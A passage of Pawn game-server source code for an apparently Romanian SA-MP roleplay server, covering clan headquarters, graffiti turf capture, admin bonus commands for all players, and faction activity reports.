	SetPlayerPos(playerid, ClanHQInfo[id][cPosX], ClanHQInfo[id][cPosY], ClanHQInfo[id][cPosZ]);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	format(gString, 128, "%s used /gotochq %d.", GetName(playerid), params[0]);
	SendAdminMessage(COLOR_GOLD, gString, 1);
	return true;
}
cmd:buyhq(playerid, params[]) {
	if !PlayerInfo[playerid][pClan] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "ERROR: Nu poti cumpara un HQ deoarece nu esti detinatorul unui clan!");

	if PlayerInfo[playerid][pClanRank] < 7 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "ERROR: Nu poti cumpara un HQ deoarece nu esti detinatorul unui clan!");

	new idd = PlayerInfo[playerid][pClan];
	if(ClanInfo[idd][clHQ] > 0) 
		return SendClientMessage(playerid, COLOR_LGREEN, "ERROR: Clanul tau are deja un HQ!");

	if PickupInfo[PlayerPickup[playerid]][pkType] != 4 *then 
		return true;

	new i=PickupInfo[PlayerPickup[playerid]][pkID];
	if !PlayerToPoint(2, playerid, ClanHQInfo[i][cPosX], ClanHQInfo[i][cPosY], ClanHQInfo[i][cPosZ]) *then
		return true;

	if ClanHQInfo[i][cClan] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest HQ este cumparat deja.");

	if ClanInfo[idd][clPremiumPoints] < ClanHQInfo[i][cPrice] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "ERROR: Nu sunt suficiente puncte premium in clan!");

	ClanInfo[idd][clPremiumPoints] -= ClanHQInfo[i][cPrice];
	ClanHQInfo[i][cClan] = PlayerInfo[playerid][pClan];
	ClanInfo[idd][clHQ] = i;
	_query("UPDATE `clans` SET `PremiumPoints`='%d', `HQ`='%d' WHERE `ID`='%d'", ClanInfo[idd][clPremiumPoints], i, idd);
	_query("UPDATE `clanhq` SET `Clan`='%d' WHERE `id`='%d'", PlayerInfo[playerid][pClan], ClanHQInfo[i][cID]);
	format(gString, 160, "{%s}[CLAN] %s a cumparat HQ ID #%d pentru %d premium points.", ClanInfo[PlayerInfo[playerid][pClan]][clColor], GetName(playerid), i, ClanHQInfo[i][cPrice]);
	SendClanMessage(PlayerInfo[playerid][pClan], gString);
	UpdateLabel(4, i);
	return true;
}
cmd:clanzones(playerid, params[]) {
	new clanid = PlayerInfo[playerid][pClan];
    if(clanid == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");
    new deelay[20]; gQuery[0] = (EOS), gString[0] = (EOS);
	strcat(gString, "#\tLocation\tOwned by\tDeelay\n");
	for(new j = 1; j <= SQL_clanzone; j++) {
	    deelay[0] = (EOS);
	    if(GraffitiInfo[j][gfDeelay]>gettime()) format(deelay, 20, "%02d:%02d", (GraffitiInfo[j][gfDeelay]-gettime())/60, (GraffitiInfo[j][gfDeelay]-gettime()) % 60);
	    else strcat(deelay, "No");
	    format(gQuery, 128, "%d.\t%s\t{%s}%s\t%s\n", j, Get3DZone(GraffitiInfo[j][gfX], GraffitiInfo[j][gfY], GraffitiInfo[j][gfZ]), ClanInfo[GraffitiInfo[j][gfOwned]][clColor], ClanInfo[GraffitiInfo[j][gfOwned]][clName], deelay);
	    strcat(gString, gQuery);
	}
	ShowPlayerDialog(playerid, DIALOG_CLANTURFS, DIALOG_STYLE_TABLIST_HEADERS, "Clan Turfs", gString, "Select", "Cancel");
	return true;
}
cmd:spray(playerid, params[]) {
	new clanid = PlayerInfo[playerid][pClan];
    if !clanid *then 
    	return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");

    if !ClanDuty[playerid] *then 
    	return SendClientMessage(playerid,-1,"Nu esti la datorie!");

	if IsPlayerInAnyVehicle(playerid) *then 
		return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda atata timp cat esti intr-un vehicul!");

    if StartedSpray2[playerid] *then 
    	return true;

	if !StartedSpray[playerid] *then ClanProces[playerid] = 0;	
	new hour,minute,second; gettime(hour,minute,second);
	if(hour < 15 || hour > 22) 
		return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda in intervalul 15:00-22:00.");

	if PlayerAreaType[playerid]!=AREA_CLANZONE *then 
		return true;

	new h = PlayerAreaID[playerid];
	if !PlayerToPoint(8, playerid, GraffitiInfo[h][gfX], GraffitiInfo[h][gfY], GraffitiInfo[h][gfZ]) *then
		return true;
    
    if GraffitiInfo[h][gfDeelay]>gettime() *then 
    	return SCMf(playerid, COLOR_LGREEN, "Eroare: Nu poti desena pe acest perte (%d sec)", (GraffitiInfo[h][gfDeelay]-gettime()));
   
    if GraffitiInfo[h][gfPlayerSpray]!=-1&&GraffitiInfo[h][gfPlayerSpray]!=playerid *then
    	return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Mai este o persoana care deseneaza pe acest perete!");
    
    if StartedSprayOn[playerid] != 0 && StartedSprayOn[playerid] != h *then
    	return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti desena pe acest perete!");
   	
   	if GraffitiInfo[h][gfOwned] == PlayerInfo[playerid][pClan] *then
   		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest perete este detinut de clanul tau!");

    if !StartedSpray[playerid] *then {
		GraffitiInfo[h][gfAttacked] = clanid;
		GraffitiInfo[h][gfPlayerSpray] = playerid;
		GangZoneFlashForAll(ClanTurfs[h], ClanInfo[clanid][clColorInt]);
		format(gString, 128, "{%s}(Clan) {FFFFFF}%s (din clanul %s) a inceput sa deseneze pe peretele clanului tau (turf id %d).", ClanInfo[GraffitiInfo[h][gfOwned]][clColor], GetName(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clName], GraffitiInfo[h][gfID]);
		SendClanMessage(GraffitiInfo[h][gfOwned], gString);
		format(gString, 128, "{%s}(Clan) {FFFFFF}%s a inceput sa deseneze pe peretele detinut de clanlul %s (turf id %d).", ClanInfo[GraffitiInfo[h][gfOwned]][clColor], GetName(playerid), ClanInfo[GraffitiInfo[h][gfOwned]][clName], GraffitiInfo[h][gfID]);
		SendClanMessage(PlayerInfo[playerid][pClan], gString);
		SendClientMessage(playerid, COLOR_GREEN, "(Spray) {FFFFFF}Ti-au fost retrasi $20,000 pentru folosirea acesti comenzi.");
		GivePlayerCash(playerid, -20000);
    }
	ApplyAnimation(playerid,"SPRAYCAN","spraycan_full",4.0,0,0,0,0,0);
	PlayerPlaySound(playerid, 1134, 0.0, 0.0, 0.0);
	SetTimerEx( "FinalProces", 4000, 0, "d", playerid );
	GameTextForPlayer(playerid, "~w~~h~spraying...", 4000, 4);
	StartedSpray[playerid] = 1;
	StartedSpray2[playerid] = 1;
	StartedSprayOn[playerid] = h;
    return true;
}

redist::FinalProces(playerid) {
	if(IsPlayerConnected(playerid) && StartedSpray[playerid] == 1) {
    	ClearAnimations(playerid);
    	new test = RandomEx(6, 8); gString[0] = (EOS);
    	ClanProces[playerid] += test;
    	if(ClanProces[playerid] >= 100) {
			new i = StartedSprayOn[playerid];
			GraffitiInfo[i][gfDeelay]=gettime()+(60*10);
			format(gString, 180, "{%s}(Clan) {FFFFFF}%s (din clanul %s) a reusit sa deseneze complet peretele (turf id %d).", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], GetName(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clName], i);
			SendClanMessage(GraffitiInfo[i][gfOwned], gString);
			format(gString, 180, "{%s}(Clan) {FFFFFF}%s a reusit sa deseneze complet peretele (turf id %d).", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], GetName(playerid), i);
			SendClanMessage(PlayerInfo[playerid][pClan], gString);
			foreach(new p : Player) if(PlayerInfo[p][pClan]==PlayerInfo[playerid][pClan]||PlayerInfo[p][pClan]==GraffitiInfo[i][gfOwned]) if(togClanTurf[p]) GangZoneShowForPlayer(p, ClanTurfs[i], ClanInfo[PlayerInfo[playerid][pClan]][clColorInt]);
			new clan = ClanTop;
			ClanInfo[GraffitiInfo[i][gfOwned]][clTop]--; ClanInfo[PlayerInfo[playerid][pClan]][clTop]++;
			if(ClanInfo[PlayerInfo[playerid][pClan]][clTop]>ClanInfo[clan][clTop]) ClanTop=PlayerInfo[playerid][pClan];
            GraffitiInfo[i][gfOwned] = PlayerInfo[playerid][pClan];
			DestroyDynamicObject(GraffitiInfo[i][gfObject]);
			GraffitiInfo[i][gfObject] = CreateDynamicObject(19353, GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ], GraffitiInfo[i][gfRotX], GraffitiInfo[i][gfRotY], GraffitiInfo[i][gfRotZ]);
			format(gString, 128, "{%s}%s\n%s", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], ClanInfo[GraffitiInfo[i][gfOwned]][clName], ClanInfo[GraffitiInfo[i][gfOwned]][clTag]);
		    SetDynamicObjectMaterialText(GraffitiInfo[i][gfObject], 0, gString, OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
			GangZoneStopFlashForAll(ClanTurfs[i]);
			GraffitiInfo[i][gfAttacked] = 0;
			GraffitiInfo[i][gfPlayerSpray] = -1;
			gQuery[0] = (EOS);
			mysql_format(SQL, gQuery, 128, "UPDATE `graffiti` SET `Owned`='%d' WHERE `ID`='%d'", PlayerInfo[playerid][pClan], GraffitiInfo[i][gfID]);
			mysql_tquery(SQL, gQuery, "", "");
			StartedSpray[playerid] = 0;
			StartedSpray2[playerid] = 0;
			StartedSprayOn[playerid] = 0;
    	}
    	else {
	    	format(gString, 60, "~w~~h~progress: %d%s", ClanProces[playerid], "%");
			GameTextForPlayer(playerid, gString, 4000, 4);
    	}
    	StartedSpray2[playerid] = 0;
	}
	return true;
}
cmd:clan(playerid, params[]) {
	if(!PlayerInfo[playerid][pClan]) return  SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");

	format(gString, sizeof(gString), "%s%s%s", ClanInfo[PlayerInfo[playerid][pClan]][clName], 
	ClanInfo[PlayerInfo[playerid][pClan]][clVip]?" {F4AD42}[VIP]":"",
	ClanInfo[PlayerInfo[playerid][pClan]][clPremium]?" {F4AD42}[PREMIUM]":"");
	ShowPlayerDialog(playerid, DIALOG_CLAN_COMMAND, DIALOG_STYLE_LIST, gString, "Members\nClan TAG\nVehicles\nSafebox\nSettings", "Select", "Close");
	return true;
}
cmd:clanchat(playerid, params[]) {
	new clanid = PlayerInfo[playerid][pClan]; gString[0] = (EOS);

	if(PlayerInfo[playerid][pMuted] == 1) 
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	
	if(!clanid) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");
	
	if(sscanf(params, "s[160]", params)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/clanchat <text>");
	
	if(togclan[playerid] == 1) 
		return SendClientMessage(playerid, COLOR_GREY, "Ai dezactivat chat-ul clanului.");
	
	if(FaceReclama(params)) 
		return Reclama(playerid, params);

	format(gString, 128, "{%s}[CLAN] %s %s: %s", ClanInfo[clanid][clColor], ClanInfo[clanid][clRankName1 + clInfo:((PlayerInfo[playerid][pClanRank]-1)*32)], GetName(playerid), params);
	SendClanMessage(clanid, gString);
	return true;
}


cmd:cinvite(playerid, params[]) {
	new clanid = PlayerInfo[playerid][pClan];
	if !clanid *then 
		return SendClientMessage(playerid, COLOR_WHITE, "La aceasta comanda au acces doar cei care fac parte dintr-un clan oficial.");

    if PlayerInfo[playerid][pClanRank] < 5 *then 
    	return SendClientMessage(playerid, COLOR_WHITE, "La aceasta categorie, are acces doar propietarul clanului si co-liderul.");

    extract params -> new player:userID; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/cinvite <playerid/name>");

	if !IsPlayerConnected(userID) *then
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !ProxDetectorS(5.0, playerid, userID) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti langa acel player!");


	if(InvitedBy[playerid] == userID && InvitedType[playerid] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "I-ai mai dat o invitatie la acelasi player!");

	if userID == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if !IsPlayerLogged(userID) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if PlayerInfo[userID][pClan] *then 
		return SendClientMessage(playerid, COLOR_WHITE, "Jucatorul invitat este deja intr-un clan!");

	if ClanMembers[PlayerInfo[playerid][pClan]] >= ClanInfo[clanid][clSlots] *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu mai poti baga membrii in clan deoarece e plin.");

	SCMf(playerid, COLOR_LIGHTBLUE, "I-ai trimis o invitatie lui %s de intrare in clan.", GetName(userID));
	SCMf(userID, COLOR_LIGHTBLUE, "Ai fost invitat in clanul %s cu tagul %s de catre %s.", ClanInfo[clanid][clName], ClanInfo[clanid][clTag], GetName(playerid));
	SCMf(userID, COLOR_LIGHTBLUE, "Foloseste /accept cinvite %d pentru a accepta invitatia de a intra in clan.", playerid);
	InvitedType[playerid] = 1;
	InvitedBy[playerid] = userID;
	return true;
}
cmd:rpforall(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti autorizat sa folosesti aceasta comanda!");

	extract params -> new rp; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/rpforall <amount>");

	format(gQuery, 180, "* Administratorul %s ti-a dat %d RP-uri ca bonus!",GetName(playerid), rp);
	foreach(new i : logged_players) {
		PlayerInfo[i][pExp] += rp;
		SendClientMessage(i,COLOR_YELLOW, gQuery);
		UpdateProgress(i, 0);
	}
	_query("UPDATE `users` SET `Respect` = `Respect` + '%i' WHERE `Status` != '-1'", rp);
	return true;
}
cmd:levelupall(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti autorizat sa folosesti aceasta comanda!");

	format(gQuery, 128, "* Administratorul %s ti-a dat un level up ca bonus!",GetName(playerid));
	foreach(new i : logged_players) {
		PlayerInfo[i][pLevel] ++;
		SetPlayerScore(i,PlayerInfo[i][pLevel]);
		SendClientMessage(i,COLOR_YELLOW, gQuery);
		UpdateProgress(i, 0);
	}
	_query("UPDATE `users` SET `Level` = `Level` + '1' WHERE `Status` != '%i'", -1);
	return true;
}

cmd:voucherforall(playerid, params[]) {
	new type, crate;
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_GREY, "Nu esti autorizat sa folosesti aceasta comanda!");
	if(sscanf(params, "ii", type, crate)) {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/voucherforall <type> <amount>");
		SendClientMessage(playerid, COLOR_GREY, "Rare vouchers(1) | Epic vouchers(2)  | Legendary vouchers(3) | mythic vouchers(4) | Millionaries vouchers(5)");
		return true;
	}
	if(type < 1 && type > 5) return SendClientMessage(playerid, COLOR_GREY, "Invalid.");
	switch(type) {
		case 0: format(gString, 128, "* Administratorul %s ti-a dat %d rare vouchers ca bonus!", GetName(playerid), crate);
		case 1: format(gString, 128, "* Administratorul %s ti-a dat %d epic vouchers ca bonus!", GetName(playerid), crate);
		case 2: format(gString, 128, "* Administratorul %s ti-a dat %d legendary vouchers ca bonus!", GetName(playerid), crate);
		case 3: format(gString, 128, "* Administratorul %s ti-a dat %d mythic vouchers ca bonus!", GetName(playerid), crate);
		case 4: format(gString, 128, "* Administratorul %s ti-a dat %d millionaries vouchers ca bonus!", GetName(playerid), crate);
	}
	foreach(new i : logged_players) {
		PlayerInfo[i][pVoucher][type-1] += crate;
		SendClientMessage(i,COLOR_YELLOW, gString);
		save_vouchers(i);
	}
	return true;
}
cmd:ppforall(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti autorizat sa folosesti aceasta comanda!");

	extract params -> new money; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/ppforall <amount>");

	format(gString, 128, "Ai primit %d premium points de la admin %s.", money, GetName(playerid));
	foreach(new i : logged_players) {
		PlayerInfo[i][pPremiumPoints] += money;
		SendClientMessage(i, COLOR_YELLOW, gString);
	}
	_query("UPDATE `users` SET `GoldPoints` = `GoldPoints`+'%i' WHERE `Status` != '-1'", money);
	return true;
}
cmd:bpforall(playerid, params[]) {
	if !IsAdmin(playerid, 7) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti autorizat sa folosesti aceasta comanda!");

	extract params -> new bp; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/dpforall <amount>");

	format(gString, 128, "Ai primit %d BPoints de la admin %s.", bp, GetName(playerid));
	foreach(new i : logged_players) {
		PlayerInfo[i][pBPoints] += bp;
		SendClientMessage(i, COLOR_YELLOW, gString);
	}
	_query("UPDATE `users` SET `BPoints` = `BPoints`+'%i' WHERE `Status` != '-1'", bp);
	return true;
}

cmd:givemoney(playerid, params[]) {
	if(!IsAdmin(playerid, 6)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new player:id, string:money[20]; else return SendUsageMsg(playerid, "givemoney [id] [amount]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(!isBigInt(money)) return SendErrorMsg(playerid, "Invalid money!");

	converBytes(money[id], money); ResetPlayerMoney(id); 
	GivePlayerMoney(id, bytes32(money[id]));

	SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s i-a dat lui %s $%s", 1, GetName(playerid), GetName(id), FormatNumbers(money));
	va_SendClientMessage(id, COLOR_YELLOW, "Admin-ul %s ti-a dat $%s", GetName(playerid), FormatNumbers(money));
	return InsertLog(id, "%s a primit $%s de la %s", LOG_MONEY, GetName(id), FormatNumbers(money), GetName(playerid));
}
cmd:moneyforall(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti autorizat sa folosesti aceasta comanda!");

	extract params -> new string:money[15]; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/moneyforall <money>");

	if !isBigInt(money) *then
		return SendClientMessage(playerid, COLOR_GREY, "Invalid money!");

	format(gString, 180, "* Administratorul %s ti-a dat $%s ca bonus!", GetName(playerid), FormatNumbers(money));
	foreach(new i : logged_players) {
		converBytes(money[i],money);
		SendClientMessage(i,COLOR_YELLOW, gString);

		ResetPlayerMoney(i);
		GivePlayerMoney(i, bytes32(money[i]));
	}
	return true;
}

cmd:checkraport(playerid, params[]) {
	if(!PlayerInfo[playerid][pMember])
		return true;

	if(PlayerInfo[playerid][pRank] < 6)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 6+");

	new id;
	if(sscanf(params, "u", id))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/checkraport <playerid/name>");
	
	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "Acel jucator nu este conectat!");

	if(!IsPlayerLogged(id))
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if(playerid == id)
		return true;

	if(PlayerInfo[id][pMember] != PlayerInfo[playerid][pMember])
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu face parte din factiunea ta!");

	SCMf(playerid, COLOR_LIGHTBLUE, "Raport-ul lui %s.", GetName(id));
	showRaport(id,playerid);
	return true;
}

cmd:requestinactivity(playerid, params[]) {
	if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti pune o invoire deoarece nu ai rank 2+!");
	if(free_request_inactivity[playerid]!=-1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai poti pune o cerere de inactivitate deoarece ai pus in urma cu putin timp. O cerere se poate pune o data la 30 zile.");
	if(PlayerInfo[playerid][pFactionInactivity]!=-1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja o cerere de inactivitate activa!");

	Dialog_Show(playerid, faction_inactivity, DIALOG_STYLE_MSGBOX, "Release Raport", "Esti sigur ca doresti sa depui o invoire la raport?\n(invoirea expira dupa 7 zile)", "Da", "Nu");
	return true;
}

Dialog:faction_inactivity(playerid, response, listitem, inputtext[]) {
	if(!response) return true;

	format(gString, sizeof(gString), "Invoire: {FFFFFF}%s a depus o invoire pentru raport.", GetName(playerid));
	SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, gString);
	SendClientMessage(playerid, COLOR_LGREEN, "Invoire depusa! Invoirea expira la procesarea raportului.");
	StartInactivityLession(playerid);
	return true;
}

cmd:raport(playerid,params[]) {
	if(!PlayerInfo[playerid][pMember])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-o factiune.");

	SendClientMessage(playerid, COLOR_WHITE, "");
	SendClientMessage(playerid, 0x4A6188FF, "Faction Raport:");
	showRaport(playerid, playerid);
	return true;
}

stock isValidResponsabil(playerid) return PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 22?true:false;

stock showRaport(playerid, targetid=-1) {
	new fid = PlayerInfo[playerid][pMember], rank = PlayerInfo[playerid][pRank], member = PlayerInfo[playerid][pMember], time = PlayerInfo[playerid][pRaportTime] - gettime(), r1,r2,r3;
	va_SendClientMessage(targetid, COLOR_WHITE, "Faction: {D7FFB3}%s (rank: %d%s), %d days, %d active paydays.", FactionName(fid), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pResponsabil]?", responsabil":"", PlayerInfo[playerid][pDays], PlayerInfo[playerid][pActivePaydays]);
	if(IsAdmin(playerid, 1)) SendClientMessage(targetid, COLOR_WHITE, "Function(s): {D7FFB3}Admin (-50%% raport)"),r1=FactionRaport[fid][rank][0]/2,r2=FactionRaport[fid][rank][1]/2,r3=FactionRaport[fid][rank][2]/2;
	else if(IsHelper(playerid, 1)) SendClientMessage(targetid, COLOR_WHITE, "Function(s): {D7FFB3}Helper (-50%% raport)"),r1=FactionRaport[fid][rank][0]/2,r2=FactionRaport[fid][rank][1]/2,r3=FactionRaport[fid][rank][2]/2;
	else if(PlayerInfo[playerid][pTester]) SendClientMessage(targetid, COLOR_WHITE, "Function(s): {D7FFB3}Tester (-50%% raport)"),r1=FactionRaport[fid][rank][0]/2,r2=FactionRaport[fid][rank][1]/2,r3=FactionRaport[fid][rank][2]/2;
	else if(PlayerInfo[playerid][pResponsabil] && (member == 7 || member == 16 || member == 21 || member == 8 || member == 22)) SendClientMessage(targetid, COLOR_WHITE, "Function(s): {D7FFB3}Responsabil"),r1=FactionRaport[fid][rank][0]/2,r2=FactionRaport[fid][rank][1]/2,r3=FactionRaport[fid][rank][2]/2;
	else SendClientMessage(targetid, COLOR_WHITE, "Function(s): none.");
	va_SendClientMessage(playerid, COLOR_WHITE, "Request Inactivity: %s", GetFactionInactivityStatus(playerid));

	switch(fid) {
		case 1, 2, 3,14,19: {
			va_SendClientMessage(targetid, COLOR_WHITE, "Runners: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
			va_SendClientMessage(targetid, COLOR_WHITE, "Tickets: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][1], r2);
			va_SendClientMessage(targetid, COLOR_WHITE, "License confiscated: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][2], r3);
		}
		case 4,5,6,10,17,18,25,26,27: {
			va_SendClientMessage(targetid, COLOR_WHITE, "War Evidences: {D7FFB3}0/0");
			va_SendClientMessage(targetid, COLOR_WHITE, "Mats: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
			va_SendClientMessage(targetid, COLOR_WHITE, "Drugs: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][1], r2);
		}
		case 12,15,23: {
			va_SendClientMessage(targetid, COLOR_WHITE, "Players shipped (without /calls): {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
			va_SendClientMessage(targetid, COLOR_WHITE, "Players shipped (with /calls): {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][1], r2);
		}
		case 13,20: va_SendClientMessage(targetid, COLOR_WHITE, "Players healed: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
		case 7,16,21: va_SendClientMessage(targetid, COLOR_WHITE, "Licenses: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
		case 8,22: {
			va_SendClientMessage(targetid, COLOR_WHITE, "Trailed vehicles: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
			va_SendClientMessage(targetid, COLOR_WHITE, "Repaired vehicles: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][1], r2);
			va_SendClientMessage(targetid, COLOR_WHITE, "Tanks filled: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][2], r3);
		}
		case 11: va_SendClientMessage(targetid, COLOR_WHITE, "Contracts: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
		case 9: {
			va_SendClientMessage(targetid, COLOR_WHITE, "Free ad sessions: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
			va_SendClientMessage(targetid, COLOR_WHITE, "News: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][1], r2);
			va_SendClientMessage(targetid, COLOR_WHITE, "Livestreams: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][2], r3);
		}
		case 24: {
			va_SendClientMessage(targetid, COLOR_WHITE, "Comenzi efectuate: {D7FFB3}%d/%d", PlayerInfo[playerid][pCommands][0], r1);
		}
	}
	va_SendClientMessage(playerid, COLOR_WHITE, "Playing hours: {D7FFB3}%.2f/3.00 (7 days)", PlayerInfo[playerid][pConnectMonth]);
	va_SendClientMessage(targetid, COLOR_WHITE, "Raport status: %s", CheckRaport(playerid, PlayerInfo[playerid][pMember], PlayerInfo[playerid][pRank]) ? ("{00ff00}Complete") : ("{ff0000}Incomplete"));
	if(PlayerInfo[playerid][pRaportTime] < gettime()) SendClientMessage(playerid, COLOR_WHITE, "The raport will be processed in: {D7FFB3}In Process..");
	else va_SendClientMessage(playerid, COLOR_WHITE, "The raport will be processed in: {D7FFB3}%d days, %d hours, %d minutes and %d seconds left.", time/86400, (time/3600) % 24, ((time/60) % 60), time % 60);
	if(PlayerInfo[playerid][pFACWarns]) {
		time = PlayerInfo[playerid][pExpFW] - gettime();
		va_SendClientMessage(targetid, COLOR_WHITE, "Faction warn(s) (%d/3) expires in: {D7FFB3}%d days, %d hours, %d minutes and %d seconds left.", time/86400, (time/3600) % 24, ((time/60) % 60), time % 60);
	}
	return true;
}

stock GetFactionInactivityStatus(playerid) {
	new time = PlayerInfo[playerid][pFactionInactivity] - gettime(), timme = free_request_inactivity[playerid] - gettime();
	if(PlayerInfo[playerid][pFactionInactivity]==-1&&free_request_inactivity[playerid]==-1) format(gString, sizeof gString, "%s", PlayerInfo[playerid][pRank] < 2?"{FF5C5C}Unavailable (rank 2+).":"{98FF5C}Available, use (/requestinactivity).");
	else if(PlayerInfo[playerid][pFactionInactivity]!=-1) format(gString, sizeof(gString), "{FFEE00}Active (%d days, %d hours, %d minutes)", time/86400, (time/3600) % 24, ((time/60) % 60));
	else if(PlayerInfo[playerid][pFactionInactivity]==-1&&free_request_inactivity[playerid]!=-1) format(gString, sizeof gString, "{FF5C5C}Unavailable (%d days, %d hours, %d minutes)", timme/86400, (timme/3600) % 24, ((timme/60) % 60));
	return gString;
}

redist::CheckRaport(playerid, fid, rank) {
	new totalraport = FactionRaport[fid][rank][0] + FactionRaport[fid][rank][1] + FactionRaport[fid][rank][2];
	if(PlayerInfo[playerid][pCommands][0] + PlayerInfo[playerid][pCommands][1] + PlayerInfo[playerid][pCommands][2] >= ((PlayerInfo[playerid][pAdmin] != 0 || PlayerInfo[playerid][pHelper] != 0 || PlayerInfo[playerid][pTester] || (PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 22 && PlayerInfo[playerid][pResponsabil])) ? (totalraport/2) : (totalraport))) return true;
	return false;
}
redist::CheckFactionRaport(playerid) {
	if(gettime() < PlayerInfo[playerid][pRaportTime] && PlayerInfo[playerid][pRaportTime] != -1) return true;

	gString[0] = EOS;
	if(PlayerInfo[playerid][pConnectMonth] < 2.95) {
		SendClientMessage(playerid, COLOR_CLIENT, "Your raport has been successfully reviewed (incomplete). You have been kicked out of faction because you have < 2.95 hours.");
		format(gString,sizeof(gString),"Your raport has been successfully reviewed (incomplete). You have been kicked out of faction because you have < 2.95 hours.");
		InsertEmail(PlayerInfo[playerid][pSQLID], "AdmBot", gString);
		Iter_Remove(faction_players<PlayerInfo[playerid][pMember]>, playerid);

		gString[0] = gQuery[0] = EOS;
		if(PlayerInfo[playerid][pDays] >= 14) {
			format(gString, 128, "%s was uninvited by AdmBot from %s (rank %d) after %d days, without FP. Reason: incomplete faction raport (hours).", PlayerInfo[playerid][pUsername], FactionName(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pDays]);
			PlayerInfo[playerid][pFpunish] = 0;
			UpdateVar(playerid, "Punish", 0);
		}
		else {
